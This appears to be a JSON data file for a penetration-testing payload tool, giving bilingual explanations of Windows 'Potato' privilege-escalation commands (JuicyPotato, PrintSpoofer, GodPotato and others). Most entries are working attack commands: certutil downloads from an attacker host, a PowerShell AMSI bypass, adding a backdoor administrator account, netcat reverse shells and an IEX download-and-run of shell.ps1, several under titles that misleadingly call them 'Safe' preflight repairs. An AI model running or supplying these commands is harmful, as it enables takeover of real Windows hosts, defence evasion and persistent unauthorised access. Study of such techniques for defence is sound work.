{
 "schemaVersion": 1,
 "entries": [
  {
   "id": "potato-attack",
   "patches": [
    {
     "area": "wafBypass",
     "index": 0,
     "expectedCommand": "JuicyPotatoNG.exe -t * -p \"cmd /c whoami\"",
     "syntaxBreakdown": [
      {
       "part": "JuicyPotatoNG.exe",
       "explanation": {
        "zh": "新版Potato工具",
        "en": "JuicyPotatoNG tool"
       },
       "type": "function"
      },
      {
       "part": "-t *",
       "explanation": {
        "zh": "两种建进程方式",
        "en": "both creation calls"
       },
       "type": "flag"
      },
      {
       "part": "-p \"cmd /c whoami\"",
       "explanation": {
        "zh": "执行命令",
        "en": "run command"
       },
       "type": "flag"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 1,
     "expectedCommand": "SharpEfsPotato.exe -p \"C:\\\\Windows\\\\System32\\\\cmd.exe\" -a \"/c whoami\"",
     "syntaxBreakdown": [
      {
       "part": "SharpEfsPotato.exe",
       "explanation": {
        "zh": ".NET EfsRpc提权",
        "en": "SharpEfsPotato tool"
       },
       "type": "function"
      },
      {
       "part": "-p \"C:\\\\Windows\\\\System32\\\\cmd.exe\"",
       "explanation": {
        "zh": "指定程序",
        "en": "program to run"
       },
       "type": "flag"
      },
      {
       "part": "-a \"/c whoami\"",
       "explanation": {
        "zh": "程序参数",
        "en": "program arguments"
       },
       "type": "flag"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 2,
     "expectedCommand": "certutil -urlcache -split -f https://{ATTACKER_HOST}/jp.exe C:\\\\Windows\\\\temp\\\\jp.exe",
     "syntaxBreakdown": [
      {
       "part": "certutil -urlcache -split -f",
       "explanation": {
        "zh": "中转下载工具",
        "en": "staged download tool"
       },
       "type": "function"
      },
      {
       "part": "https://{ATTACKER_HOST}/jp.exe",
       "explanation": {
        "zh": "HTTPS下载地址",
        "en": "HTTPS download URL"
       },
       "type": "url"
      },
      {
       "part": "C:\\\\Windows\\\\temp\\\\jp.exe",
       "explanation": {
        "zh": "落地路径",
        "en": "drop path"
       },
       "type": "value"
      }
     ]
    },
    {
     "area": "wafBypass",
     "index": 3,
     "expectedCommand": "powershell -nop -c \"[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); C:\\\\Windows\\\\temp\\\\jp.exe -l 1337 -p cmd.exe\"",
     "syntaxBreakdown": [
      {
       "part": "powershell -nop -c",
       "explanation": {
        "zh": "无配置执行命令",
        "en": "run command, no profile"
       },
       "type": "function"
      },
      {
       "part": "AmsiUtils",
       "explanation": {
        "zh": "定位AMSI类",
        "en": "resolve AMSI class"
       },
       "type": "value"
      },
      {
       "part": "amsiInitFailed",
       "explanation": {
        "zh": "置位标志字段",
        "en": "failure flag field"
       },
       "type": "value"
      },
      {
       "part": "C:\\\\Windows\\\\temp\\\\jp.exe -l 1337 -p cmd.exe",
       "explanation": {
        "zh": "绕过后执行工具",
        "en": "run tool after bypass"
       },
       "type": "payload"
      }
     ]
    },
    {
     "area": "execution",
     "index": 0,
     "expectedCommand": "whoami /priv\nwhoami /all\necho %USERNAME%",
     "title": {
      "zh": "特权前提与账号基线核对",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 1"
     }
    },
    {
     "area": "execution",
     "index": 1,
     "expectedCommand": "certutil -urlcache -split -f http://{ATTACKER_HOST}/JuicyPotato.exe C:\\temp\\jp.exe\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami > C:\\temp\\proof.txt\" -t *\nC:\\temp\\jp.exe -l 1337 -p C:\\Windows\\System32\\cmd.exe -a \"/c net user testadmin Test@123 /add && net localgroup administrators testadmin /add\" -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}\nC:\\temp\\jp.exe -l 1337 -p C:\\temp\\nc.exe -a \"-e cmd.exe {ATTACKER_IP} {LPORT}\" -t *",
     "title": {
      "zh": "JuicyPotato 提权验证",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 2"
     }
    },
    {
     "area": "execution",
     "index": 2,
     "expectedCommand": "PrintSpoofer.exe -i -c cmd\nPrintSpoofer.exe -c \"cmd /c whoami > C:\\temp\\proof.txt\"\nPrintSpoofer.exe -c \"C:\\temp\\nc.exe {ATTACKER_IP} {LPORT} -e cmd.exe\"\nPrintSpoofer.exe -i -c powershell.exe",
     "title": {
      "zh": "PrintSpoofer 提权验证",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 3"
     }
    },
    {
     "area": "execution",
     "index": 3,
     "expectedCommand": "SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a \"/c whoami\"\nSweetPotato.exe -e EfsRpc -p cmd.exe -a \"/c net user testadmin Test@123 /add\"",
     "title": {
      "zh": "SweetPotato 提权验证",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 4"
     }
    },
    {
     "area": "execution",
     "index": 4,
     "expectedCommand": "GodPotato.exe -cmd \"cmd /c whoami\"\nGodPotato.exe -cmd \"cmd /c C:\\temp\\nc.exe -e cmd.exe {ATTACKER_IP} {LPORT}\"\nGodPotato.exe -cmd \"net user testadmin Test@123 /add && net localgroup administrators testadmin /add\"\nGodPotato.exe -cmd \"powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{ATTACKER_HOST}/shell.ps1')\"",
     "title": {
      "zh": "GodPotato 提权验证",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 5"
     }
    },
    {
     "area": "execution",
     "index": 5,
     "expectedCommand": "# 攻击机：把 135 端口转发到 {LAB_HOST}:9999（{LAB_HOST} 上需先运行 Rogue 监听器，如 RogueWinRM.exe）",
     "command": "# 攻击机：把 135 端口转发到 {LAB_HOST}:9999（{LAB_HOST} 上需先运行 Rogue 监听器，如 RogueWinRM.exe）",
     "title": {
      "zh": "RoguePotato 与 socat 中继提权验证",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 6"
     }
    },
    {
     "area": "execution",
     "index": 6,
     "expectedCommand": "Write-Output 'PAYLOADER_POTATO_ATTACK_REVIEW_7'",
     "title": {
      "zh": "执行链路贯通标记输出",
      "en": "Safe Potato-Tool Capability Preflight Command Repair 7"
     }
    },
    {
     "area": "wafBypass",
     "index": 15,
     "expectedCommand": "PrintSpoofer.exe -c \"whoami > C:\\out.txt\"",
     "title": {
      "zh": "PrintSpoofer 提权执行命令",
      "en": "Validation step 2 for PrintSpoofer Prerequisite Audit"
     }
    },
    {
     "area": "wafBypass",
     "index": 21,
     "expectedCommand": "GodPotato.exe -cmd \"cmd /c powershell -e {LAB_BASE64_COMMAND}\"",
     "title": {
      "zh": "GodPotato 执行编码命令",
      "en": "Execute a SYSTEM command with GodPotato"
     }
    }
   ]
